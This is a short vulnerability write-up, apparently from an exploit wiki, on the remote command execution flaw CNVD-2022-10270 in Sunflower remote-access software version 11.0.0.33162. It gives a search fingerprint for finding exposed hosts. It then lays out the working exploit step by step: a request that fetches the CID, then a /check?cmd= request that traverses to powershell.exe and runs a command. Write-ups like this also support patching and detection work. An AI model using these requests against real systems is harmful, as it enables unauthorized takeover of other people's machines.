---
Title: Sunflower check Remote command execution vulnerability CNVD-2022-10270
---

# Sunflower check Remote command execution vulnerability CNVD-2022-10270

## Vulnerability Description

After Sunflower obtains the CID by sending a specific request, it can call the check interface to implement remote command execution, resulting in the server permission being obtained.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">11.0.0.33162</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">body="Verification failure"</span>

## Vulnerability reappears

After opening the sunflower, it will open a certain port between 40000-65535 by default.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645007224265-6dd3bed6-0d66-433d-96db-2532796ded2a.png)

Send a request to obtain the CID

```javascript
/cgi-bin/rpc?action=verify-haras
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645007276844-29bf52d8-e4c4-4ece-8d9e-a5e2386de7c2.png)

Use the obtained verification_string as the CID field of the cookie to execute the command

```javascript
/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645007355798-42ab03f8-8652-4daf-a4c3-29938ce2f000.png)